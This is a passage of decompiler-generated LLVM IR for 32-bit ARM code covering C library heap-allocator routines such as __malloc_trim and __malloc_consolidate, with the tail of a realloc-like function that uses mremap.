  %v1_11774 = add i32 %v3_1176c, 4
  %v1_11778 = add i32 %v3_11770, -1
  store i32 %v1_11778, i32* %r2.global-to-local, align 4
  %v2_1177c = add i32 %v1_11774, %v1_11778
  %v1_11780 = load i32, i32* @sb, align 4
  %v2_11780 = add i32 %v2_1177c, %v1_11780
  store i32 %v2_11780, i32* %r3.global-to-local, align 4
  %v2_11784 = sub i32 0, %v3_11770
  %v3_11784 = and i32 %v2_11780, %v2_11784
  store i32 %v3_11784, i32* @r7, align 4
  %v2_11788 = sub i32 %v3_11784, %v3_1176c
  store i32 %v2_11788, i32* @fp, align 4
  %v9_1178c = icmp eq i32 %v1_11580, %v2_11788
  br i1 %v9_1178c, label %dec_label_pc_11800, label %dec_label_pc_11794

dec_label_pc_11794:                               ; preds = %dec_label_pc_11760
  %v2_11794 = sub i32 %v1_1157c, %v3_1176c
  store i32 %v2_11794, i32* %r0.global-to-local, align 4
  %v2_11798 = add i32 %v3_1176c, %v1_11580
  store i32 %v2_11798, i32* %r1.global-to-local, align 4
  store i32 %v3_11784, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_117a4 = call i32 @mremap(i32 %v2_11794, i32 %v2_11798, i32 %v3_11784, i32 1)
  store i32 %v4_117a4, i32* %r0.global-to-local, align 4
  %v7_117a8 = icmp eq i32 %v4_117a4, -1
  br i1 %v7_117a8, label %dec_label_pc_117f4, label %dec_label_pc_117b0

dec_label_pc_117b0:                               ; preds = %dec_label_pc_11794
  %v1_117b0 = load i32, i32* @r4, align 4
  %v2_117b0 = add i32 %v1_117b0, %v4_117a4
  store i32 %v2_117b0, i32* %r0.global-to-local, align 4
  %v0_117b4 = load i32, i32* @fp, align 4
  %v1_117b4 = or i32 %v0_117b4, 2
  store i32 %v1_117b4, i32* %r3.global-to-local, align 4
  %v2_117b8 = add i32 %v2_117b0, 4
  %v3_117b8 = inttoptr i32 %v2_117b8 to i32*
  store i32 %v1_117b4, i32* %v3_117b8, align 4
  %v0_117bc = load i32, i32* @r8, align 4
  %v1_117bc = add i32 %v0_117bc, 868
  %v2_117bc = inttoptr i32 %v1_117bc to i32*
  %v3_117bc = load i32, i32* %v2_117bc, align 4
  store i32 %v3_117bc, i32* %r3.global-to-local, align 4
  %v1_117c0 = add i32 %v0_117bc, 880
  %v2_117c0 = inttoptr i32 %v1_117c0 to i32*
  %v3_117c0 = load i32, i32* %v2_117c0, align 4
  store i32 %v3_117c0, i32* %r2.global-to-local, align 4
  %v0_117c4 = load i32, i32* @r6, align 4
  %v2_117c4 = sub i32 %v3_117bc, %v0_117c4
  store i32 %v2_117c4, i32* %r3.global-to-local, align 4
  %v1_117c8 = load i32, i32* @r7, align 4
  %v2_117c8 = add i32 %v1_117c8, %v2_117c4
  store i32 %v2_117c8, i32* %r1.global-to-local, align 4
  %v1_117cc = add i32 %v0_117bc, 872
  %v2_117cc = inttoptr i32 %v1_117cc to i32*
  %v3_117cc = load i32, i32* %v2_117cc, align 4
  store i32 %v3_117cc, i32* %r3.global-to-local, align 4
  %v1_117d4 = add i32 %v0_117bc, 884
  %v2_117d4 = inttoptr i32 %v1_117d4 to i32*
  %v3_117d4 = load i32, i32* %v2_117d4, align 4
  store i32 %v3_117d4, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_117c8, %v3_117c0
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_117b0
  store i32 %v2_117c8, i32* %v2_117c0, align 4
  %v0_117dc.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_117dc.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_117b0, %bb33
  %v1_117dc = phi i32 [ %v0_117bc, %dec_label_pc_117b0 ], [ %v1_117dc.pre, %bb33 ]
  %v0_117dc = phi i32 [ %v2_117c8, %dec_label_pc_117b0 ], [ %v0_117dc.pre, %bb33 ]
  %v2_117dc = add i32 %v1_117dc, 868
  %v3_117dc = inttoptr i32 %v2_117dc to i32*
  store i32 %v0_117dc, i32* %v3_117dc, align 4
  %v0_117e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_117e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_117e0 = add i32 %v1_117e0, %v0_117e0
  store i32 %v2_117e0, i32* %r1.global-to-local, align 4
  %v1_117e4 = load i32, i32* %r2.global-to-local, align 4
  %v0_117e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_117e8 = add i32 %v0_117e8, 8
  store i32 %v1_117e8, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_117e0, %v1_117e4
  br i1 %tmp43, label %bb35, label %dec_label_pc_1182c

bb35:                                             ; preds = %bb34
  %v5_117ec = load i32, i32* @r8, align 4
  %v6_117ec = add i32 %v5_117ec, 884
  %v7_117ec = inttoptr i32 %v6_117ec to i32*
  store i32 %v2_117e0, i32* %v7_117ec, align 4
  br label %dec_label_pc_1182c

dec_label_pc_117f4:                               ; preds = %dec_label_pc_11794
  %v0_117f4 = load i32, i32* @sb, align 4
  %v1_117f4 = add i32 %v0_117f4, 4
  store i32 %v1_117f4, i32* %r3.global-to-local, align 4
  %v0_117f8 = load i32, i32* @r6, align 4
  %v3_117f8 = icmp ult i32 %v0_117f8, %v1_117f4
  br i1 %v3_117f8, label %dec_label_pc_11808, label %dec_label_pc_117f4.dec_label_pc_11800_crit_edge

dec_label_pc_117f4.dec_label_pc_11800_crit_edge:  ; preds = %dec_label_pc_117f4
  %v0_11800.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11800

dec_label_pc_11800:                               ; preds = %dec_label_pc_117f4.dec_label_pc_11800_crit_edge, %dec_label_pc_11760
  %v0_11800 = phi i32 [ %v0_11800.pre, %dec_label_pc_117f4.dec_label_pc_11800_crit_edge ], [ %v0_11568, %dec_label_pc_11760 ]
  store i32 %v0_11800, i32* @r4, align 4
  br label %dec_label_pc_1182c

dec_label_pc_11808:                               ; preds = %dec_label_pc_117f4
  %v1_11808 = add i32 %v0_117f4, -7
  store i32 %v1_11808, i32* @r0, align 4
  %v0_1180c = call i32 @malloc()
  store i32 %v0_1180c, i32* @r0, align 4
  store i32 %v0_1180c, i32* @r4, align 4
  %v2_11810 = icmp eq i32 %v0_1180c, 0
  br i1 %v2_11810, label %dec_label_pc_1182c, label %dec_label_pc_11818

dec_label_pc_11818:                               ; preds = %dec_label_pc_11808
  %v0_11818 = load i32, i32* @r6, align 4
  %v1_11818 = add i32 %v0_11818, -8
  store i32 %v1_11818, i32* @r2, align 4
  %v0_1181c = load i32, i32* @r5, align 4
  store i32 %v0_1181c, i32* @r1, align 4
  %v0_11820 = call i32 @memcpy()
  %v0_11824 = load i32, i32* @r5, align 4
  store i32 %v0_11824, i32* @r0, align 4
  %v0_11828 = call i32 @free()
  store i32 %v0_11828, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1182c

dec_label_pc_1182c:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_11808, %dec_label_pc_11800, %dec_label_pc_11758, %.thread6, %dec_label_pc_115c8, %dec_label_pc_11818
  store i32 %v2_11514, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  %v4_1183c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1183c)
  br label %dec_label_pc_11848

dec_label_pc_11848:                               ; preds = %dec_label_pc_11548, %dec_label_pc_114f0, %dec_label_pc_114d8, %dec_label_pc_1182c
  %v0_11848 = load i32, i32* @r4, align 4
  store i32 %v0_11848, i32* %r0.global-to-local, align 4
  store i32 %v3_114b8, i32* @r4, align 4
  store i32 %v6_114b8, i32* @r5, align 4
  store i32 %v9_114b8, i32* @r6, align 4
  store i32 %v12_114b8, i32* @r7, align 4
  store i32 %v15_114b8, i32* @r8, align 4
  store i32 %v18_114b8, i32* @sb, align 4
  store i32 %v21_114b8, i32* @sl, align 4
  store i32 %v24_114b8, i32* @fp, align 4
  store i32 %v27_114b8, i32* @lr, align 4
  ret i32 %v0_11848

; uselistorder directives
  uselistorder i32 %v2_117e0, { 1, 0, 2 }
  uselistorder i32 %v2_117c8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_117a4, { 1, 0, 2 }
  uselistorder i32 %v3_11784, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11728, { 2, 1, 0 }
  uselistorder i32 %v2_116f8, { 1, 0, 2 }
  uselistorder i32 %v0_1168c, { 1, 0 }
  uselistorder i32 %v0_11648, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_115ac, { 0, 2, 1, 3 }
  uselistorder i32 %v2_115a4, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_11588, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_11580, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1157c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1156c, { 1, 0 }
  uselistorder i32 %v0_11568, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_11540, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11848, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1182c, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_11758, { 1, 0 }
  uselistorder label %dec_label_pc_116f8, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11644, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11638, { 1, 0 }
  uselistorder label %dec_label_pc_11634, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1185c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1185c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1185c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1185c, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_1185c
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_11870.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11870.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_11874.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_1185c, %bb
  %v4_11874 = phi i32 [ %v4_11874.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_1185c ], [ 0, %bb ]
  ret i32 %v4_11874

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_11878 = add i32 %arg2, 44
  %v2_11878 = inttoptr i32 %v1_11878 to i32*
  %v3_11878 = load i32, i32* %v2_11878, align 4
  %v12_1187c = load i32, i32* @r7, align 4
  %v1_11880 = add i32 %v3_11878, 4
  %v2_11880 = inttoptr i32 %v1_11880 to i32*
  %v3_11880 = load i32, i32* %v2_11880, align 4
  %v1_11884 = add i32 %arg2, 860
  %v2_11884 = inttoptr i32 %v1_11884 to i32*
  %v3_11884 = load i32, i32* %v2_11884, align 4
  store i32 %v3_11884, i32* @r4, align 4
  %v1_11888 = and i32 %v3_11880, -4
  store i32 %v1_11888, i32* @r6, align 4
  %v1_1188c = add i32 %v1_11888, -17
  %v2_11890 = add i32 %v1_1188c, %v3_11884
  store i32 %arg2, i32* @r5, align 4
  %v2_1189c = sub i32 %v2_11890, %arg1
  store i32 %v3_11884, i32* %r1.global-to-local, align 4
  %v2_118a4 = udiv i32 %v2_1189c, %v3_11884
  %v1_118a8 = add i32 %v2_118a4, -1
  store i32 %v1_118a8, i32* %r0.global-to-local, align 4
  %v2_118ac = mul i32 %v1_118a8, %v3_11884
  store i32 %v2_118ac, i32* @r7, align 4
  %v2_118b0 = icmp eq i32 %v2_118ac, 0
  store i1 %v2_118b0, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_118ac, 1
  br i1 %tmp8, label %dec_label_pc_11918, label %dec_label_pc_118b8

dec_label_pc_118b8:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_118bc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_118bc, i32* %r0.global-to-local, align 4
  %v0_118c0 = load i32, i32* @r5, align 4
  %v1_118c0 = add i32 %v0_118c0, 44
  %v2_118c0 = inttoptr i32 %v1_118c0 to i32*
  %v3_118c0 = load i32, i32* %v2_118c0, align 4
  %v0_118c4 = load i32, i32* @r6, align 4
  %v2_118c4 = add i32 %v0_118c4, %v3_118c0
  %v9_118c8 = icmp eq i32 %v1_118bc, %v2_118c4
  store i1 %v9_118c8, i1* @cpsr_z, align 1
  store i32 %v1_118bc, i32* @r4, align 4
  br i1 %v9_118c8, label %dec_label_pc_118d4, label %dec_label_pc_11918

dec_label_pc_118d4:                               ; preds = %dec_label_pc_118b8
  %v0_118d4 = load i32, i32* @r7, align 4
  %v1_118d4 = sub i32 0, %v0_118d4
  store i32 %v1_118d4, i32* %r0.global-to-local, align 4
  %v1_118d8 = call i32 @__GI_sbrk(i32 %v1_118d4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_118e0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_118e0, i32* %r0.global-to-local, align 4
  %v7_118e4 = icmp eq i32 %v1_118e0, -1
  store i1 %v7_118e4, i1* @cpsr_z, align 1
  br i1 %v7_118e4, label %dec_label_pc_11918, label %dec_label_pc_118ec

dec_label_pc_118ec:                               ; preds = %dec_label_pc_118d4
  %v0_118ec = load i32, i32* @r4, align 4
  %v2_118ec = sub i32 %v0_118ec, %v1_118e0
  store i32 %v2_118ec, i32* %r0.global-to-local, align 4
  %v9_118ec = icmp eq i32 %v0_118ec, %v1_118e0
  store i1 %v9_118ec, i1* @cpsr_z, align 1
  br i1 %v9_118ec, label %dec_label_pc_11918, label %dec_label_pc_118f4

dec_label_pc_118f4:                               ; preds = %dec_label_pc_118ec
  %v0_118f4 = load i32, i32* @r5, align 4
  %v1_118f4 = add i32 %v0_118f4, 872
  %v2_118f4 = inttoptr i32 %v1_118f4 to i32*
  %v3_118f4 = load i32, i32* %v2_118f4, align 4
  %v1_118f8 = load i32, i32* @r6, align 4
  %v2_118f8 = sub i32 %v1_118f8, %v2_118ec
  store i32 %v2_118f8, i32* %r2.global-to-local, align 4
  %v1_118fc = add i32 %v0_118f4, 44
  %v2_118fc = inttoptr i32 %v1_118fc to i32*
  %v3_118fc = load i32, i32* %v2_118fc, align 4
  store i32 %v3_118fc, i32* %r1.global-to-local, align 4
  %v2_11900 = sub i32 %v3_118f4, %v2_118ec
  %v1_11904 = or i32 %v2_118f8, 1
  store i32 %v1_11904, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_11900, i32* %v2_118f4, align 4
  %v0_11910 = load i32, i32* %r2.global-to-local, align 4
  %v1_11910 = load i32, i32* %r1.global-to-local, align 4
  %v2_11910 = add i32 %v1_11910, 4
  %v3_11910 = inttoptr i32 %v2_11910 to i32*
  store i32 %v0_11910, i32* %v3_11910, align 4
  %v1_11924.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1191c

dec_label_pc_11918:                               ; preds = %dec_label_pc_118b8, %dec_label_pc_118ec, %dec_label_pc_118d4, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1191c

dec_label_pc_1191c:                               ; preds = %dec_label_pc_118f4, %dec_label_pc_11918
  %v1_11924 = phi i32 [ %v1_11924.pre, %dec_label_pc_118f4 ], [ 0, %dec_label_pc_11918 ]
  store i32 %v12_1187c, i32* @r7, align 4
  ret i32 %v1_11924

; uselistorder directives
  uselistorder i1 %v7_118e4, { 1, 0 }
  uselistorder i32 %v1_118e0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11884, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1191c, { 1, 0 }
  uselistorder label %dec_label_pc_11918, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11928 = load i32, i32* @r4, align 4
  store i32 %v3_11928, i32* %stack_var_-36, align 4
  %v0_1192c = load i32, i32* @r0, align 4
  %v1_1192c = inttoptr i32 %v0_1192c to i32*
  %v2_1192c = load i32, i32* %v1_1192c, align 4
  store i32 %v2_1192c, i32* %r3.global-to-local, align 4
  %v2_11930 = icmp eq i32 %v2_1192c, 0
  store i32 %v0_1192c, i32* @r4, align 4
  br i1 %v2_11930, label %dec_label_pc_11a68.preheader, label %dec_label_pc_11944

dec_label_pc_11a68.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_11a7025 = add i32 %v0_1192c, 52
  store i32 %v1_11a7025, i32* %r3.global-to-local, align 4
  %v2_11a7826 = add i32 %v0_1192c, 60
  %v3_11a7827 = inttoptr i32 %v2_11a7826 to i32*
  store i32 %v1_11a7025, i32* %v3_11a7827, align 4
  %v0_11a7c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_11a7c29 = add i32 %v0_11a7c28, 12
  %v3_11a7c30 = inttoptr i32 %v2_11a7c29 to i32*
  store i32 %v0_11a7c28, i32* %v3_11a7c30, align 4
  br label %dec_label_pc_11a68.dec_label_pc_11a68_crit_edge

dec_label_pc_11944:                               ; preds = %entry
  %v1_11944 = and i32 %v2_1192c, -3
  %v3_11948 = udiv i32 %v2_1192c, 8
  store i32 %v3_11948, i32* %r2.global-to-local, align 4
  store i32 %v1_11944, i32* %v1_1192c, align 4
  %v0_11950 = load i32, i32* @r0, align 4
  %v1_11950 = add i32 %v0_11950, -4
  store i32 %v1_11950, i32* %r3.global-to-local, align 4
  %v1_11954 = load i32, i32* %r2.global-to-local, align 4
  %v4_11954 = mul i32 %v1_11954, 4
  %v5_11954 = add i32 %v4_11954, %v1_11950
  store i32 %v5_11954, i32* %sb.global-to-local, align 4
  %v1_11958 = add i32 %v0_11950, 52
  store i32 %v1_11958, i32* %r7.global-to-local, align 4
  %v1_1195c = add i32 %v0_11950, 4
  store i32 %v1_1195c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11964

dec_label_pc_11964:                               ; preds = %dec_label_pc_11a60, %dec_label_pc_11944
  %v1_11a5810 = phi i32 [ %v1_11a58, %dec_label_pc_11a60 ], [ %v5_11954, %dec_label_pc_11944 ]
  %v1_11970 = phi i32 [ %v1_11a60, %dec_label_pc_11a60 ], [ %v1_1195c, %dec_label_pc_11944 ]
  %v1_11964 = inttoptr i32 %v1_11970 to i32*
  %v2_11964 = load i32, i32* %v1_11964, align 4
  store i32 %v2_11964, i32* %r1.global-to-local, align 4
  %v2_11968 = icmp eq i32 %v2_11964, 0
  br i1 %v2_11968, label %dec_label_pc_11a58, label %dec_label_pc_11970

dec_label_pc_11970:                               ; preds = %dec_label_pc_11964
  %v0_11970 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_11970, i32* %v1_11964, align 4
  %v0_11974.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11974

dec_label_pc_11974:                               ; preds = %dec_label_pc_11a4c, %dec_label_pc_11970
  %v0_11990 = phi i32 [ %v0_11a4c, %dec_label_pc_11a4c ], [ %v0_11974.pre, %dec_label_pc_11970 ]
  %v1_11974 = add i32 %v0_11990, 4
  %v2_11974 = inttoptr i32 %v1_11974 to i32*
  %v3_11974 = load i32, i32* %v2_11974, align 4
  store i32 %v3_11974, i32* %r3.global-to-local, align 4
  %v1_11978 = and i32 %v3_11974, -2
  store i32 %v1_11978, i32* %lr.global-to-local, align 4
  %v2_1197c = add i32 %v1_11978, %v0_11990
  store i32 %v2_1197c, i32* @r0, align 4
  %v1_11980 = urem i32 %v3_11974, 2
  %v2_11980 = icmp eq i32 %v1_11980, 0
  %v1_11984 = add i32 %v0_11990, 8
  %v2_11984 = inttoptr i32 %v1_11984 to i32*
  %v3_11984 = load i32, i32* %v2_11984, align 4
  store i32 %v3_11984, i32* %sl.global-to-local, align 4
  %v1_11988 = add i32 %v2_1197c, 4
  %v2_11988 = inttoptr i32 %v1_11988 to i32*
  %v3_11988 = load i32, i32* %v2_11988, align 4
  store i32 %v3_11988, i32* %r8.global-to-local, align 4
  br i1 %v2_11980, label %dec_label_pc_11990, label %dec_label_pc_119c4

dec_label_pc_11990:                               ; preds = %dec_label_pc_11974
  %v1_11990 = inttoptr i32 %v0_11990 to i32*
  %v2_11990 = load i32, i32* %v1_11990, align 4
  store i32 %v2_11990, i32* %r5.global-to-local, align 4
  %v2_11994 = sub i32 %v0_11990, %v2_11990
  store i32 %v2_11994, i32* %r3.global-to-local, align 4
  %v1_11998 = add i32 %v2_11994, 8
  %v2_11998 = inttoptr i32 %v1_11998 to i32*
  %v3_11998 = load i32, i32* %v2_11998, align 4
  store i32 %v3_11998, i32* %ip.global-to-local, align 4
  %v1_1199c = add i32 %v3_11998, 12
  %v2_1199c = inttoptr i32 %v1_1199c to i32*
  %v3_1199c = load i32, i32* %v2_1199c, align 4
  store i32 %v3_1199c, i32* %r1.global-to-local, align 4
  %v9_119a0 = icmp eq i32 %v3_1199c, %v2_11994
  %v1_119a4 = add i32 %v2_11994, 12
  %v2_119a4 = inttoptr i32 %v1_119a4 to i32*
  %v3_119a4 = load i32, i32* %v2_119a4, align 4
  store i32 %v3_119a4, i32* %r2.global-to-local, align 4
  br i1 %v9_119a0, label %dec_label_pc_119ac, label %dec_label_pc_11a08

dec_label_pc_119ac:                               ; preds = %dec_label_pc_11990
  %v1_119ac = add i32 %v3_119a4, 8
  %v2_119ac = inttoptr i32 %v1_119ac to i32*
  %v3_119ac = load i32, i32* %v2_119ac, align 4
  store i32 %v3_119ac, i32* %r3.global-to-local, align 4
  %v9_119b0 = icmp eq i32 %v3_119ac, %v2_11994
  br i1 %v9_119b0, label %dec_label_pc_119b8, label %dec_label_pc_11a08

dec_label_pc_119b8:                               ; preds = %dec_label_pc_119ac
  store i32 %v3_11998, i32* %v2_119ac, align 4
  %v0_119bc = load i32, i32* %r2.global-to-local, align 4
  %v1_119bc = load i32, i32* %ip.global-to-local, align 4
  %v2_119bc = add i32 %v1_119bc, 12
  %v3_119bc = inttoptr i32 %v2_119bc to i32*
  store i32 %v0_119bc, i32* %v3_119bc, align 4
  %v0_119c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_119c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_119c0 = add i32 %v1_119c0, %v0_119c0
  store i32 %v2_119c0, i32* %lr.global-to-local, align 4
  %v0_119c8.pre = load i32, i32* @r0, align 4
  %v0_119cc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_119c4

dec_label_pc_119c4:                               ; preds = %dec_label_pc_11974, %dec_label_pc_119b8
  %v0_11a3c = phi i32 [ %v1_11978, %dec_label_pc_11974 ], [ %v2_119c0, %dec_label_pc_119b8 ]
  %v0_119cc = phi i32 [ %v3_11988, %dec_label_pc_11974 ], [ %v0_119cc.pre, %dec_label_pc_119b8 ]
  %v1_119e0 = phi i32 [ %v2_1197c, %dec_label_pc_11974 ], [ %v0_119c8.pre, %dec_label_pc_119b8 ]
  %v0_119c4 = load i32, i32* @r4, align 4
  %v1_119c4 = add i32 %v0_119c4, 44
  %v2_119c4 = inttoptr i32 %v1_119c4 to i32*
  %v3_119c4 = load i32, i32* %v2_119c4, align 4
  store i32 %v3_119c4, i32* %r3.global-to-local, align 4
  %v9_119c8 = icmp eq i32 %v1_119e0, %v3_119c4
  %v1_119cc = and i32 %v0_119cc, -4
  store i32 %v1_119cc, i32* %r5.global-to-local, align 4
  br i1 %v9_119c8, label %dec_label_pc_11a3c, label %dec_label_pc_119d4

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119c4
  %v2_119d4 = add i32 %v1_119e0, %v1_119cc
  store i32 %v2_119d4, i32* %r3.global-to-local, align 4
  %v1_119d8 = add i32 %v2_119d4, 4
  %v2_119d8 = inttoptr i32 %v1_119d8 to i32*
  %v3_119d8 = load i32, i32* %v2_119d8, align 4
  store i32 %v3_119d8, i32* %r3.global-to-local, align 4
  %v1_119dc = urem i32 %v3_119d8, 2
  %v2_119dc = icmp eq i32 %v1_119dc, 0
  %v2_119e0 = add i32 %v1_119e0, 4
  %v3_119e0 = inttoptr i32 %v2_119e0 to i32*
  store i32 %v1_119cc, i32* %v3_119e0, align 4
  br i1 %v2_119dc, label %dec_label_pc_119e8, label %dec_label_pc_119d4.dec_label_pc_11a18_crit_edge

dec_label_pc_119d4.dec_label_pc_11a18_crit_edge:  ; preds = %dec_label_pc_119d4
  %v0_11a1c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11a18

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119d4
  %v0_119e8 = load i32, i32* @r0, align 4
  %v1_119e8 = add i32 %v0_119e8, 8
  %v2_119e8 = inttoptr i32 %v1_119e8 to i32*
  %v3_119e8 = load i32, i32* %v2_119e8, align 4
  store i32 %v3_119e8, i32* %ip.global-to-local, align 4
  %v1_119ec = add i32 %v3_119e8, 12
  %v2_119ec = inttoptr i32 %v1_119ec to i32*
  %v3_119ec = load i32, i32* %v2_119ec, align 4
  store i32 %v3_119ec, i32* %r3.global-to-local, align 4
  %v9_119f0 = icmp eq i32 %v3_119ec, %v0_119e8
  %v1_119f4 = add i32 %v0_119e8, 12
  %v2_119f4 = inttoptr i32 %v1_119f4 to i32*
  %v3_119f4 = load i32, i32* %v2_119f4, align 4
  store i32 %v3_119f4, i32* %r2.global-to-local, align 4
  br i1 %v9_119f0, label %dec_label_pc_119fc, label %dec_label_pc_11a08

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119e8
  %v1_119fc = add i32 %v3_119f4, 8
  %v2_119fc = inttoptr i32 %v1_119fc to i32*
  %v3_119fc = load i32, i32* %v2_119fc, align 4
  store i32 %v3_119fc, i32* %r3.global-to-local, align 4
  %v9_11a00 = icmp eq i32 %v3_119fc, %v0_119e8
  br i1 %v9_11a00, label %dec_label_pc_11a0c, label %dec_label_pc_11a08

dec_label_pc_11a08:                               ; preds = %dec_label_pc_119e8, %dec_label_pc_119ac, %dec_label_pc_11990, %dec_label_pc_119fc
  %v0_11a08 = call i32 @abort()
  store i32 %v0_11a08, i32* @r0, align 4
  %v0_11a0c.pre = load i32, i32* @ip, align 4
  %v1_11a0c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11a0c

dec_label_pc_11a0c:                               ; preds = %dec_label_pc_119fc, %dec_label_pc_11a08
  %v1_11a0c = phi i32 [ %v3_119f4, %dec_label_pc_119fc ], [ %v1_11a0c.pre, %dec_label_pc_11a08 ]
  %v0_11a0c = phi i32 [ %v3_119e8, %dec_label_pc_119fc ], [ %v0_11a0c.pre, %dec_label_pc_11a08 ]
  %v2_11a0c = add i32 %v1_11a0c, 8
  %v3_11a0c = inttoptr i32 %v2_11a0c to i32*
  store i32 %v0_11a0c, i32* %v3_11a0c, align 4
  %v0_11a10 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a10 = load i32, i32* %ip.global-to-local, align 4
  %v2_11a10 = add i32 %v1_11a10, 12
  %v3_11a10 = inttoptr i32 %v2_11a10 to i32*
